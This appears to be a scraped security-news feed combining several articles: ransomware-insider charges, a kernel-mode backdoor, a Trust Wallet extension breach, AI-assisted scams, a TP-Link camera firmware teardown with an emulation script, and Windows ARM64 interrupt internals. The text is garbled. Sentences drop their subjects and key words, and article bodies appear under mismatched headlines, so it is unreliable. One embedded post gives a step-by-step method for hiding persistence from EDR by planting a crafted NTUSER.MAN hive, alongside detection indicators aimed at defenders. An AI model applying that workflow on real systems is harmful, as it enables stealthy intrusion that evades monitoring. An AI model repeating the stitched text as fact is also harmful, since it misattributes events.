Ryan Goldberg and Kevin Martin admitted to conspiring to extort U.S. organizations, abusing the same security expertise they once used to defend cyber victims. Working with a third accomplice, they breached multiple companies nationwide and shared roughly 20% of ransom proceeds for access to BlackCat’s infrastructure. Prosecutors say they demanded between $300,000 and $10 million per victim.Alternative to insider risk at the highest technical levels, similar threats are emerging from much lower in the access chain, too. Indian , a popular cryptoexchange with more arrests are expected. The incident exposed data from roughly 69,500 users after bribed staff at outsourcing partner, TaskUs, enabled access. This news follows charges against Ronald Spektor, accused of stealing $16 million by impersonating Coinbase, highlighting ongoing insider and social engineering risks.Beyond insider abuse, attackers are also exploiting everyday user behavior to siphon funds at massive scale. A , an illegal Windows and Office software activator. The suspect used clipper malware to swap cryptocurrency addresses and divert funds to attacker-controlled ones. Korean National Police Agency says the campaign ran from 2020 to 2023, with a total of KRW 1.7 billion ($1.2M) stolen across thousands of transactions. Authorities warn that pirated software is often a key component in how attackers spread malware.The Bad | Chinese-Based Attackers Deploy Stealthy Kernel‑Mode ‘ToneShell’ BackdoorSecurity researchers have uncovered , now delivered via a kernel‑mode loader for the first time. New analysis links the campaign to G0129 (Bronze President, TEMP.Hex, Hive0154), a threat actor known for targeting government agencies, NGOs, and think tanks.The activity, observed since at least February, primarily targets government organizations across Asia, particularly in Myanmar and Thailand. Investigators have found evidence that some victims had previously been compromised by earlier ToneShell variants, PlugX malware, or the ToneDisk USB worm, indicating long‑term persistence across multiple intrusion waves.What sets this campaign apart is its use of a malicious kernel‑mode mini‑filter driver, , signed with a stolen or leaked digital certificate originally issued to Guangzhou Kingteller Technology Co., Ltd and valid between 2012 to 2015. Operating deep within the Windows kernel,  by manipulating the WdFilter driver’s load order.The driver ultimately injects two user‑mode payloads, including the updated ToneShell backdoor, which now features enhanced stealth capabilities. Changes also include a simplified host‑ID scheme, network traffic obfuscation using fake TLS headers, and remote administration capabilities such as file transfer and interactive shell access. Communication occurs over TCP port 443 to an attacker‑controlled infrastructure.Researchers note this marks a clear evolution in G0129’s tactics, prioritizing kernel‑level persistence and evasion. As the payload operates almost entirely in memory, memory forensics becomes a critical detection method, alongside monitoring for indicators of compromise tied to the malicious driver and injected shellcode.The Ugly | Hackers Steal $7M via Compromised Trust Wallet Chrome ExtensionAfter a compromised update to the . The malicious version 2.68.0 contained a hidden JavaScript file called  that silently exfiltrated sensitive wallet data, including seed phrases, to an external server, api.metrics-trustwallet[.]com. Users immediately reported funds disappearing after simple wallet authorizations, prompting Trust Wallet to investigate and release a patched version 2.69. CEO Eowyn Chen confirmed the hack and assured users that the company would reimburse affected wallets.Investigations indicate that attackers likely exploited a leaked Chrome Web Store API key to publish the malicious extension, bypassing Trust Wallet’s standard release procedures. In parallel, threat actors launched a phishing campaign using a Trust Wallet-branded site, , claiming to provide a “vulnerability fix”. Users who entered their seed phrases on the site immediately lost access to their wallets. WHOIS records suggest the phishing domain may be linked to the same actors behind the malicious extension.Trust Wallet, a non-custodial cryptocurrency wallet acquired by Binance in 2018, emphasized that mobile-only users and other browser extension versions were not affected. The company has begun reimbursing victims after verifying wallet ownership, transaction hashes, and affected addresses, while warning users not to share private keys or seed phrases.Security researchers noted the incident highlights . Trust Wallet has suspended compromised API keys, reported the malicious domains to registrars, and continues monitoring for scams. Users are strongly advised to immediately update to version 2.69, only use official channels, and verify all communications to protect their crypto assets.]]></content:encoded></item><item><title>Transparent Tribe Launches New RAT Attacks Against Indian Government and Academia</title><link>https://thehackernews.com/2026/01/transparent-tribe-launches-new-rat.html</link><author>The Hacker News</author><category>security</category><enclosure url="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjaFyRmyuVgO_C0sj1T6dS6xOHtQzLfUUckXuj31BDmfIdvD6xMza5hxryu06NflKvAWIOrqiIl5qZRQRuiTXiRoGkzSSCmfffHmkoW6w1yu7wWkXbk3YnnPQojFwLfDhnCvmjU063dxagQoIPFtiyxLoBP-V36reDJ7__kmAZQ5UD4Ybva-cvjDryruo2W/s1600/india.jpg" length="" type=""/><pubDate>Fri, 2 Jan 2026 13:52:00 +0000</pubDate><source url="https://thehackernews.com/">The Hacker News</source><content:encoded><![CDATA[The threat actor known as Transparent Tribe has been attributed to a fresh set of attacks targeting Indian governmental, academic, and strategic entities with a remote access trojan (RAT) that grants them persistent control over compromised hosts.

Run keys, shell extensions, COM hijacks: the patterns are well documented and the detection coverage reflects this.This post explores a technique for establishing registry persistence and registry writes against HKCU at medium integrity without triggering registry callbacks.EDR solutions monitor registry modifications through . This kernel callback mechanism allows drivers to intercept registry operations before they complete. When a process calls  or , registered callbacks receive notification with full context: the key path, the data being written, and the process responsible.Kernel Patch Protection (PatchGuard) prevents vendors from hooking the kernel directly.  provides a supported alternative, and most endpoint security products rely on it for registry visibility.Elastic's Uncommon Registry Persistence Change rule is representative. It monitors registry paths including:These paths represent classic persistence locations. The detection logic filters out known legitimate modifications and alerts on the rest.The approach works because registry writes go through the registry APIs, which trigger the callbacks, which generate telemetry. Every step in this chain is well instrumented.The chain assumes registry writes use the registry APIs.Windows user profiles store registry hives in the user's profile directory.  contains the user's  hive and gets loaded at logon.  takes priority when present.The  extension denotes a . Originally designed for kiosk and shared workstation scenarios, Windows checks for this file first and loads it instead of the standard  hive. Microsoft's documentation describes the intended use case:A mandatory user profile is a roaming user profile that has been preconfigured by an administrator to specify settings for users.The Active Directory Migration Tool (ADMT) provides an example of this priority handling. When translating user profiles during domain migrations, ADMT must locate the correct hive file. The source code shows the priority logic:When  exists, Windows does not merge it with . The  file becomes the entire HKCU hive for that session.Placing a crafted  in  loads persistence keys into HKCU on next logon. The hive is loaded directly from disk without invoking registry APIs. monitors registry operations. Hive loads are not registry operations. The callbacks are not invoked.Filesystem events will trigger. Writing the file to the profile directory is visible to any EDR monitoring file operations. Registry-focused detections remain blind.Medium integrity is sufficient. The target is the user's own profile directory, which they have write access to. Local admin is not required.The profile subsystem loads , not alongside it. The target user's existing hive is required as a starting point, with persistence keys added to it. Enterprise environments configure application settings, shell preferences, environment variables, and policy state through the registry. Replacing the hive wholesale results in a visibly broken session.The registry can be exported in two formats: binary (the raw hive) or  (text format). Binary export requires elevation. Text export does not.The general recommended workflow, while you can drop an arbitrary hive on disk, is as follows:Export the target user's HKCU hive as  format (BOFs exist for this)Add persistence entries to the  fileConvert to binary hive format using tooling such as HiveSwarmingWrite the modified hive as  in the target's  directoryOn next login, Windows loads the hive from  with your additional registry keys now present in HKCU - without registry API calls.User hives remain locked while the session is active; Windows holds a handle on the loaded hive, preventing modification or replacement. cannot be swapped while the target user is logged in. Activation requires logoff and logon, or a system reboot. This makes it a persistence mechanism rather than immediate execution.Operating as a different user or SYSTEM allows staging the file in the target's profile directory, but the hive will not load until their next session starts. Removal works the same way: log in as a different user so the hive is not locked.Mandatory profiles can be assigned via Active Directory. The profile path attribute on a user object points to a network share:This opens two possible avenues:1. Modify the profile path. With write access to the target user's AD object, point their profile path to a share you control containing a crafted .On next logon, Windows fetches the hive from your share. This requires Write Property on the  attribute - typically granted through delegated OU administration or membership in Account Operators.However, without access to their current hive, crafting a functional  is difficult. We advise against this approach.2. Write to an existing profile share. Roaming profile shares with weak permissions allow direct placement of  following the earlier workflow. The target user's next logon loads your hive instead of their existing profile.The roaming profile case has an additional consideration. Microsoft's documentation notes that when the profile server is unavailable, Windows falls back to a locally cached copy if one exists. A target who normally works on-premise but occasionally connects remotely may load your hive only when on the corporate network.The only indicator for local persistence is the file write. Registry telemetry shows nothing because the registry APIs were not called.File writes to  in any profile directoryFile writes to  on roaming profile sharesExistence of  files outside expected mandatory profile deploymentsModifications to the  attribute on AD user objectsHive load events correlating with unexpected  filesMandatory profiles are rare in modern environments. Outside of kiosk or shared workstation configurations, their presence warrants investigation.Credit to Windows security researcher Jonas L for highlighting this "intended functionality".]]></content:encoded></item><item><title>Flock Exposes Its AI-Enabled Surveillance Cameras</title><link>https://www.schneier.com/blog/archives/2026/01/flock-exposes-its-ai-enabled-surveillance-cameras.html</link><author>Bruce Schneier</author><category>security</category><pubDate>Fri, 2 Jan 2026 12:05:24 +0000</pubDate><source url="https://www.schneier.com/">Schneier on Security</source><content:encoded><![CDATA[Unlike many of Flock’s cameras, which are designed to capture license plates as people drive by, Flock’s Condor cameras are pan-tilt-zoom (PTZ) cameras designed to record and track people, not vehicles.

This one focuses on how AI is being used to design more realistic campaigns, accelerate social engineering, and how AI agents can be used to target individuals.Most cybercriminals stick with what works. But once a new method proves effective, it spreads quickly—and new trends and types of campaigns follow.In 2025, the rapid development of Artificial Intelligence (AI) and its use in cybercrime went hand in hand. In general, AI allows criminals to improve the scale, speed, and personalization of social engineering through realistic text, voice, and video. Victims face not only financial loss, but erosion of trust in digital communication and institutions.One of the main areas where AI improved was in the area of voice-cloning, which was immediately picked up by scammers. In the past, they would mostly stick to impersonating friends and relatives. In 2025, they went as far as impersonating senior US officials. The targets were predominantly current or former US federal or state government officials and their contacts. In the course of these campaigns, cybercriminals used test messages as well as AI-generated voice messages. At the same time, they did not abandon the distressed-family angle. A woman in Florida was tricked into handing over thousands of dollars to a scammer after her daughter’s voice was AI-cloned and used in a scam.Another use we see frequently is AI-assisted vulnerability discovery. These tools are in use by both attackers and defenders. For example, Google uses a project called Big Sleep, which has found several vulnerabilities in the Chrome browser.As mentioned in the section on AI agents, combining data posted on social media with data stolen during breaches is a common tactic. Such freely provided data is also a rich harvesting ground for romance scams, sextortion, and holiday scams. And then there are the vulnerabilities in public AI platforms such as ChatGPT, Perplexity, Claude, and many others. Researchers and criminals alike are still exploring ways to bypass the safeguards intended to limit misuse. Prompt injection is the general term for when someone inserts carefully crafted input, in the form of an ordinary conversation or data, to nudge or force an AI into doing something it wasn’t meant to do.In some cases, attackers have used AI platforms to write and spread malware. Researchers have documented campaign where attackers leveraged Claude AI to automate the entire attack lifecycle, from initial system compromise through to ransom note generation, targeting sectors such as government, healthcare, and emergency services. AI is amplifying the capabilities of both defenders and attackers. Security teams can use it to automate detection, spot patterns faster, and scale protection. Cybercriminals, meanwhile, are using it to sharpen social engineering, discover vulnerabilities more quickly, and build end-to-end campaigns with minimal effort.Looking toward 2026, the biggest shift may not be technical but psychological. As AI-generated content becomes harder to distinguish from the real thing, verifying voices, messages, and identities will matter more than ever.We don’t just report on threats—we remove them]]></content:encoded></item><item><title>Cybercriminals Abuse Google Cloud Email Feature in Multi-Stage Phishing Campaign</title><link>https://thehackernews.com/2026/01/cybercriminals-abuse-google-cloud-email.html</link><author>The Hacker News</author><category>security</category><enclosure url="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiYs3DrTLoxNKDEunQc4yjZyAmnuhSyJGccrpxhneZyB6iJ29zkbfcoDpsPZlJYL59ZNTX09BS4FmbV_Yv2WjkB-mptBp_vVyYa4PpPY5jk73XydEvhAdyS-oHdUzSmbCobA7Gnnf6Iogvs3YdR2yC0XkkCGzdz3e9PQ3qg5kaVRVmn3OKxLbfaT2b0SIld/s1600/phishing-email.jpg" length="" type=""/><pubDate>Fri, 2 Jan 2026 09:14:00 +0000</pubDate><source url="https://thehackernews.com/">The Hacker News</source><content:encoded><![CDATA[Cybersecurity researchers have disclosed details of a phishing campaign that involves the attackers impersonating legitimate Google-generated messages by abusing Google Cloud's Application Integration service to distribute emails.

Among several devices, I found several RCEs and other interesting vulnerabilities that are still pending patches and CVE assignment.

One of the devices was TP-Link’s latest Tapo C260 camera, and while I do not plan to share any details of vulnerabilities yet (if there were any 😉), I want to share about the process of reverse engineering the firmware.

In addition, as part of my research I reverse-engineered the Tapo Discovery Protocol version 2. Version 1 has been thoroughly research and exploited by others before including at Pwn2Own, but since I couldn’t find any resources on the new version I thought it might be interesting to share.

In any case, I thought the C260 was a nice step up in difficulty from my previous ventures into the Nokia Beacon 1 and the LAU-G150-C Optical Network Terminal.

# Teardown 🔗

The C260 is a tough nut to crack, quite literally. It has a high-quality shell with no exposed screws - not even hidden under stickers or pads.

I found the iFixit Jimmy (they were actually giving them out for free at DEF CON) invaluable here in prying the case apart. There’s a bit of technique involved here - instead of trying to use it as a lever or cutter, first get part of the blade into the gap, then wobble it up and down so it slowly gets deeper into the gap. This creates a lot more leverage and room to maneuver.

After that, there are a few more screws and cases to pry open before getting to the juicy internals:

This is a fairly advanced camera with a multiple features like 4k camera, AI object recognition, microSD support, BT, and WiFi, with the components spread out across a few boards.

You may have noticed a `UART_TX` label in the first picture but they don’t work out of the box. Previous researchers of other Tapo devices typically had to reconnect these pins first to get them working.

More importantly, I located the flash memory - an ESMT F50L1G41LB chip in the WSON8 package (left side of first image).

# Static Analysis 🔗

The next step was to read it using the XGecu T48 programmer. Unfortunately, the provided WSON8 adapter for T48 was actually too small to fit the chip. To get around this, I used their alligator clip adapter (which fit the WSON8 pins) and connected it to the SOP8 adapter instead.

From there, it was fairly straightforward to read the chip as it was one of the supported devices for the T48. This time, I also made sure to remove the extra 64-byte OOB data as documented in the chip’s data sheet:

```
The device contains 1024 blocks, composed by 64 pages consisting in two NAND structures of 32 series connected Flash cells. Each page consists 2112-Byte and is further divided into a 2048-Byte data storage area with a separate 64-Byte spare area. The 64-Byte area is typically used for memory and error management.
```

Next was decrypting the filesystem - yes, Tapo devices do use filesystem encryption. Fortunately, a lot of work has already been done by Quentin Kaiser as detailed in his C200 blogpost (which also includes reconnecting the UART port), and the same hardcoded AES-128-CFB1 scheme and key are still in use!

Once I unpacked the Squash filesystem, I zoomed into the `/bin/main` binary, which contained most of the relevant handlers for web requests and other protocols.

As I’m saving some details for another blogpost on other parts of the C260 firmware, I’ll focus on the handler for Tapo Discovery Protocol.

## Tapo Discovery Protocol v2 🔗

The `main` binary has a lot of helpful logging messages that help identify the name of the function. In this case, I started in `tdpd_listen_thread` at offset `0x2a7e0`, which creates UDP sockets on port 20002 and 20010.

Next, the handler parses the incoming packet and helpfully logs the various struct values:

```
puVar8 = (undefined8 *) recvfrom(param_1,&DAT_00323530,0x1000,0,(sockaddr *)&DAT_00323310,&local_3c); if ((int)puVar8 < 1) { pcVar15 = "[TDPD]tdpd recv error."; uVar11 = 0x966; pcVar25 = "tdpd_handle"; LAB_0002a694: uVar18 = 3; goto LAB_00029c3c; } if ((int)puVar8 < 0x10) { bVar37 = 0x10; pcVar15 = "[TDPD]recvbuf length = %d, less than hdr\'s %d"; pcVar25 = "tdpd_handle"; uVar11 = 0x96c; LAB_0002a236: msg_debug(0,0x10,3,pcVar25,uVar11,pcVar15,puVar8,bVar37); return; } uVar20 = (uint)DAT_00323534; uVar21 = (uint)DAT_00323532; uVar22 = (uint)DAT_00323537; uVar23 = (uint)DAT_00323536; puVar39 = &DAT_00323540; uVar11 = _DAT_00323538; uVar38 = DAT_0032353c; msg_debug(0,0x10,1,"tdpd_handle",0x971, "[TDPD]recv packet:\nversion:%d\nreserved:%d\nflag:%d\nresult:%d\nopcode:%d\npayloadleng th:%d\nsn:%lu\nchecksum:%lu\npayload=%s\n" ,DAT_00323530,DAT_00323531,uVar23,uVar22,uVar21,uVar20,_DAT_00323538,DAT_0032353c, &DAT_00323540);
```

As can be seen in the final logging call, there’s a `version` value. It uses the version in an if/else statement further down that either uses the old handler for version 1 packets (which previous researchers have reverse-engineered), or a new set of handlers for version 2 packets via a switch statement:

```
switch(uVar28) { case 1: input_obj = jso_from_string(&DAT_00323540); if (input_obj == 0) { puVar32 = &DAT_00323540; msg_debug(0,0x10,3,"tdpd_build_discovery_app_packet",0x717, "[TDPD][Error] invalid json string = %s",&DAT_00323540,puVar14); jso_add_int(0,"error_code",0xffffffff); } else { out_root_obj = jso_new_obj(); if (out_root_obj == 0) { msg_debug(0,0x10,3,"tdpd_build_discovery_app_packet",0x720, "[TDPD][Error] failed to create out_root_obj",puVar32,puVar14); jso_add_int(0,"error_code",0xffffffff); jso_free_obj(input_obj); } else { result_obj = jso_new_obj(); if (result_obj == 0) { msg_debug(0,0x10,3,"tdpd_build_discovery_app_packet",0x728, "[TDPD][Error] failed to create result_obj"); jso_add_int(out_root_obj,"error_code",0xffffffff); LAB_0002a282: jso_free_obj(input_obj); iVar30 = jso_to_string(out_root_obj,&DAT_00324540,0xff0); if (iVar30 < 0) goto LAB_0002a48a; } else { iVar12 = tdpd_get_basic_info_v2(input_obj,result_obj);
```

In short, version 2 unlocks a lot more interesting functionality. I won’t dive into all the details here, but some of the interesting differences from version 1 are:

- Big-endian instead of little-endian
- CRC32 checksum instead of custom checksum
- A `tdpd_get_encrypt_info_v2` function that uses RSA encryption to send more comprehensive system data

# Emulating and Testing 🔗

While static analysis was helpful, I wanted to send real packets to a running camera. However, my rudimentary script failed. I knew I needed to have some sort of debugging set up to ensure I had correctly set the right struct sizes and values. There were two options - try to get UART access (and potentially encounter more blockers before getting a proper shell) or perform emulation.

Fortunately, with the entire filesystem, I could approximately emulate the running binary using Qiling framework. There were a few hurdles along the way, such as requiring some configuration values to be initiated. I intercept the `read_config` function using `ql.hook_address` and simply wrote to memory the missing values. Furthermore, since the `main` function executed several other handlers besides TDP, I manually redirected execution by changing the PC register to the address of the `tdpd_handle` function.

Next, I injected my generated TDP packet by hooking the `recvfrom` call.

Another final tweak I made was to modify the debug logging function to output to stdout (3) instead of null, allowing me to get the highly-informative logging messages and errors in my Qiling output.

```
PACKET = create_tdpd_packet(version=2, opcode=2, payload=OPCODE_2_PACKET) print(PACKET) def read_c_string(ql: Qiling, address: int, max_length: int = 256) -> str: raw_bytes = b"" for i in range(max_length): byte = ql.mem.read(address + i, 1) if byte == b'\x00': break raw_bytes += byte return raw_bytes.decode('utf-8', errors='ignore') # or 'ascii' def my_recvfrom(ql: Qiling, sockfd: int, buf: int, length: int, flags: int, addr: int, addrlen: int): ql.mem.write(buf, PACKET) return len(PACKET) def redirect_tdpd_handle(ql: Qiling) -> None: ql.arch.regs.lr = EXIT_ADDRESS ql.arch.regs.pc = 0x29728 | 1 # hook debug wrapper to also output to stdout def msg_debug_wrapper(ql: Qiling) -> None: ql.arch.regs.r2 = 3 def read_config_enter(ql: Qiling) -> None: config_key = read_c_string(ql, ql.arch.regs.r0) print(f'Reading config {config_key}') if config_key == '/cloud_config/extra_bind': ql.mem.write(ql.arch.regs.r1, b'data_collect') def read_config_exit(ql: Qiling) -> None: print(f'Value is {read_c_string(ql, ql.arch.regs.r5)}') def debug_tmp(ql: Qiling) -> None: print(read_c_string(ql, ql.arch.regs.r0)) print(read_c_string(ql, ql.arch.regs.r1)) EXIT_ADDRESS = 0x2ABC0 def main(): executable_path = 'squashfs-root/bin/main' rootfs_path = 'squashfs-root' ql = Qiling([executable_path], rootfs_path, archtype=QL_ARCH.ARM, ostype=QL_OS.LINUX, multithread=True)#, verbose=QL_VERBOSE.DEBUG) ql.os.set_syscall('recvfrom', my_recvfrom, QL_INTERCEPT.CALL) ql.hook_address(redirect_tdpd_handle, 0x1CB66) ql.hook_address(msg_debug_wrapper, 0x1C514) # read_config hooks ql.hook_address(read_config_enter, 0x134394) ql.hook_address(read_config_exit, 0x134444) ql.hook_address(read_config_exit, 0x1343B2) ql.hook_address(debug_tmp, 0x2B280) ql.run(end=EXIT_ADDRESS) if __name__ == "__main__": main()
```

Despite being held together with the code equivalent of duct tape and a prayer, it worked well enough that I could get a working generated packet on a running camera! I’ve shared the script on GitHub; do let me know if there are any corrections or improvements I can make.

## Conclusion 🔗

I’ve quickly coming to understand that reverse-engineering each new device comes with its own quirks and rabbit holes. While it might appear relatively straightforward in this post, I spent countless hours hunting down the right research, fighting with hardware, and stepping through broken code.

I found that AI-assisted RE was pretty helpful but not comprehensive enough for key details like structs, endianness, and so on. There’s been a lot of exciting developments recently focusing on plugging directly into disassemblers like AETHER with IDA Pro MCP that would certainly improve the user experience from simply plonking the pseudocode into Gemini.

As hinted in the beginning, I’m still not at liberty to share more details until I’m sure patches from SPIRITCYBER have been completed, but stay tuned for more exciting details!]]></content:encoded></item><item><title>Windows ARM64 Internals: Pardon The Interruption!

Interrupts on Windows for ARM

## Introduction

Recently, I posted a blog which introduced some building blocks related to Windows on ARM (WoA) systems. I have always “known” that interrupts are fairly architecture-specific, and that the implementation of an “interrupt schema” can differ based on this notion. Given this, I thought it would be interesting to investigate the interrupt functionality surrounding WoA systems.

In this blog post, there are likely going to be many omissions - including the fact that (Generic Interrupt Controller) GICv4 systems allow the direct injection of virtual interrupts (my WoA system, for instance, is only on GIC version 3), and many other nuances surrounding virtualization and interrupts in general (although we will touch on virtualization and Secure Kernel “secure interrupts”).

Lastly, this blog post is not meant to be a regurgitation of the existing ARM documentation about low-level interrupt details - although certainly some of this knowledge will be required, and is also outlined in this blog where applicable. This blog, instead, is focused on the theme of a previous blog I did on ARM64 Windows internals - showcasing the basics of ARM64 to Windows researchers who come from an x64 background, like myself, and to outline the differences between x64 and ARM64 interrupt dispatching on Windows systems.

## Generic Interrupt Controller (GIC) Overview

One of the main differences between the traditional Intel-based x86 architecture and ARM is the employment, by ARM, of the _Generic Interrupt Controller_ \- or GIC. The Advanced Programmable Interrupt Controller (APIC) is the controller which most are probably familiar with, who come from a Windows background. This is because this is Intel’s family of interrupt controllers - with most Windows machines running on Intel.

The GIC, on ARM, has seen several iterations. The Surface Pro machine in which this analysis was performed leverages GICv3. However - ARM now has documentation for GICv5. This was announced a few months ago by ARM. This section of the blog is just meant to introduce the basics, and the curious reader should visit the ARM documentation for more information.

The main purpose of the implementation of a GIC on an ARM system is a standardized way to handle interrupts. The below image, from ARM, provides a high-level overview of GIC interrupt delivery.

This section of the blog will not act as a “glossary” of terms surrounding GIC features. ARM provides documentation surrounding lower-level details. For our purposes, it is - however - worth mentioning the following specifically surrounding what is present in GICv3 (although not necessarily _new_ to GICv3):

- There are two types of interrupts: IRQ and FIQ
  - IRQ is a standard interrupt request at _normal_ priority.
  - FIQ is a _fast_ interrupt request which is _higher_ priority than an IRQ.
- There are four main “sources” of interrupts:
  - External (Shared Peripheral Interrupt, or SPI). This is _external_ in the sense that the interrupt can be delivered to any processor.
  - Internal (Private/Per-Processor Peripheral Interrupt, or PPI). This is _private_ to a particular processor. An example of a PPI would be a performance interrupt being generated on a particular processor. The PMU is a per-CPU construct and a target’s CPU can be configured for generation of performance-related information in which an interrupt is generated when certain conditions are true - resulting in a PPI.
  - Software-based (Software Generated Interrupt, or SGI). The “ARM” version of an IPI - or _Inter-processor interrupt_(when a core sends an interrupt to another core)
  - Locality-specific (Locality-specific Peripheral Interrupt, or LPI): These are _always_ message-based interrupts which can be generated from an _Interrupt Translation Services_, or ITS. The Surface Pro machine in which this analysis was conducted on does not implement any ITS’s. However, this does not mean that message-based interrupts cannot still be generated and handled.
- Although Windows, as mentioned in a previous blog post, doesn’t really use TrustZone with VBS enabled (VTLs provide non-secure/secure world functionality) - interrupts are _also_ divided between “secure” and “non-secure” (related to TrustedZone security states)
- A GIC allows for providing virtual interrupt functionality (vGIC) for hypervisors (with nuances based on the GIC version. More on this later.)

In addition to handling interrupts which fire from an “interrupt signal”, from hardware (referred to sometimes as hardware “buzzing” or “poking” the interrupt controller) GICs _also_ support message-based interrupts. The delivery mechanism for these interrupts vary slightly (more on this later). Given that each interrupt source are made up of _multiple_ interrupt IDs (INTIDs) (e.g., interrupt IDs 0-15 are SGIs, 16-31 are PPIs, etc.) this allows not every single ID to need to be physically wired.

Notice above we refer to _interrupt sources_ \- which are represented by a particular INTID - which maps to an “interrupt line” (with a particular “group” of sources, e.g., SPI, PPI, etc.). Interrupts “come” from interrupt sources. Lastly, before we get into the Windows implementation, let’s summarize a four of the important structures in the GIC architecture which are collectively referred to as the _Interrupt Routing Infrastructure_, or IRI. The IRI and interrupt-routing scheme, taken from the Arm Generic Interrupt Controller Architecture Specification, looks as follows.

## GIC Distributor

The GIC distributor is the “brain” of the interrupt schema - and all _physical_ interrupt sources are wired to this component. It is a physically present on a particular SoC (system on a chip, which is how ARM integrates the CPU/GPU/memory controllers/peripherals/etc. into a “single chip”) and it is always accessible via physical memory and not a system register (but the Windows kernel also maps it into virtual memory). There is a _single_ distributor structure on a system.

The distributor primarily prioritzes and distributes physical interrupts to the redistributors (and CPU interfaces). This is especially true for SPIs, which are “external” to a particular CPU in the sense that the distributor must route the interrupt to the specific CPU.

The distributor is involved in software-generated interrupts (like IPIs, even though the interrupts _originate_ from a particular processor) and facilitates routing. However, for interrupts specific to a CPU (like PPI) the distributor does _not_ need to be involved.

## GIC Redistributor

Redistributors are _per-CPU_ structures - and there is only _one_ redistributor per CPU. The redistributor receives SPIs that are routed from the interrupt source to the distributor. Redistributors have a few more “moving parts”, or nuances.

In addition, when _software-initialited_ interrupts (like an inter-processor interrupt requested from software) occur (SGIs), they are generated by both the “issuing” CPU interface and redistributor. From these components, they are then routed to the distributor and then the _target_ CPU’s redistributor and CPU interface receive the interrupt.

PPIs are interrupts which are _local_ to a specific CPU. Because of this, the distributor is not needed at all. The interrupt source interrupt is directly routed to the CPU’s redistributor. Additionally, LPIs are routed to a target redistributor.

## GIC CPU Interface

The various CPU interfaces, then, become the mechansim to which a core actually receives an interrupt. There is both a _physical_ CPU interface and a _virtual_ CPU interface present (but for now when we refer to the “CPU interface” we are referring to the _physical_ interface). The CPU interface is accessible through system registers (or memory-mapped interface, but Windows uses the system registers). This means the registers can be used to mask interrupts and control the state of interrupts on the CPU.

## GIC Interrupt Translation Services (ITS)

The ITS is an _optional_ (for GICv3, which our machine is using). The ITS has a primary usage - message-based interrupts (MSIs). The ITS, when it is present, is responsible for routing LPIs (which represent message-based interrupts) to a target CPU’s redistributor. They are also responsible for actually translating the MSI request (message-based interrupt) into an LPI.

The Surface Pro machine in which this analysis was performed does not implement an ITS, but it still _does_ support LPIs (LPIs are supported but ITS is not required). GIC4 requires an ITS because GIC4 needs to support virtual LPIs due to support for direct injection of virtual interrupts to a VM without involving the hypervisor.

Lastly, the following image summarizes the basic interrupt routine schema - taken once again from ARM documentation.

## Windows on ARM Interrupt Initialization And Discovery

Although there are some references to interrupt functionality before it, we will start at `nt!HalpInitializeInterrupts`. This function is responsible for most of the interrupt discovery and initialization that we care about. `nt!HalpInitializeInterrupts` receives a single parameter - the loader parameter block, from the bootloader, represented by the `nt!_LOADER_PARAMETER_BLOCK` structure.

One of the first things this function does is to perform “GIC” discovery. The kernel will attempt to first discover GICv3, and will “default” to checking if GICv1 is available.

> As a point of contention,
>
>  `nt!HalSetInterruptProblem` accepts a parameter to a value from the `INTERRUPT_PROBLEM` enum. For ARM devices, the following are valid values, which can help aid in debugging/determining what is occuring. For example, in this case the error from the above image denotes that discovery is occuring ( `InterruptProblemFailedDiscovery`):

```
lkd> dt nt!_INTERRUPT_PROBLEM InterruptProblemNone = 0n0 InterruptProblemMadtParsingFailure = 0n1 InterruptProblemNoControllersFound = 0n2 InterruptProblemFailedDiscovery = 0n3 InterruptProblemInitializeLocalUnitFailed = 0n4 InterruptProblemInitializeIoUnitFailed = 0n5 InterruptProblemSetLogicalIdFailed = 0n6 InterruptProblemSetLineStateFailed = 0n7 InterruptProblemGenerateMessageFailed = 0n8 InterruptProblemConvertIdFailed = 0n9 InterruptProblemCmciSetupFailed = 0n10 InterruptProblemQueryMaxProcessorsCalledTooEarly = 0n11 InterruptProblemProcessorReset = 0n12 InterruptProblemStartProcessorFailed = 0n13 InterruptProblemProcessorNotAlive = 0n14 InterruptProblemLowerIrqlViolation = 0n15 InterruptProblemInvalidIrql = 0n16 InterruptProblemNoSuchController = 0n17 InterruptProblemNoSuchLines = 0n18 InterruptProblemBadConnectionData = 0n19 InterruptProblemBadRoutingData = 0n20 InterruptProblemInvalidProcessor = 0n21 InterruptProblemFailedToAttainTarget = 0n22 InterruptProblemUnsupportedWiringConfiguration = 0n23 InterruptProblemSpareAlreadyStarted = 0n24 InterruptProblemClusterNotFullyReplaced = 0n25 InterruptProblemNewClusterAlreadyActive = 0n26 InterruptProblemNewClusterTooLarge = 0n27 InterruptProblemCannotHardwareQuiesce = 0n28 InterruptProblemIpiDestinationUpdateFailed = 0n29 InterruptProblemNoMemory = 0n30 InterruptProblemNoIrtEntries = 0n31 InterruptProblemConnectionDataBaitAndSwitch = 0n32 InterruptProblemInvalidLogicalFlatId = 0n33 InterruptProblemDeinitializeLocalUnitFailed = 0n34 InterruptProblemDeinitializeIoUnitFailed = 0n35 InterruptProblemMismatchedThermalLvtIsr = 0n36 InterruptProblemHvRetargetFailed = 0n37 InterruptProblemDeferredErrorSetupFailed = 0n38 InterruptProblemBadInterruptPartition = 0n39
```

`nt!HalpGic3Discover` begins by enumerating the Advanced Configuration and Power Interface (ACPI) table named “APIC”. In order for there to less work for the hardware abstraction layer (HAL) Windows effectively requires that ARM64 systems which run Windows require ACPI.

ACPI is a specification which is used to allow hardware to _describe_ the interfaces which are available for usage by software. ACPI is particularly relevant to us because it describes interrupt functionality on the system. After all, interrupts are not just a software construct - the actual computer chips have physical wiring used for many interrupt operations, as an example. As such, the ACPI interface exposes a series of _tables_ which allow the OS to become enlightened about the actual hardware configuration of the machine - including the interrupt configuration.

The ACPI “APIC” table _really_ refers to the Multiple APIC Description Table, or MADT. Although APIC is the name used, as Intel-based systems have dominated for so long, the latest versions of ACPI (5.0 and beyond) have added descriptors for GIC - which is what ARM-based systems use (not APIC). The MADT, as we will refer to it, is responsible for describing the interrupt functionality of the system - specific describing the GIC and also GIC distributor (which we have previously mentioned).

The `nt!ExtEnvGetAcpiTable`, in this case, returns a pointer to an `nt!_MAPIC` structure - which represents the MADT, and contains the following layout. You can cross-reference this layout with the latest ACPI specification from UEFI:

```
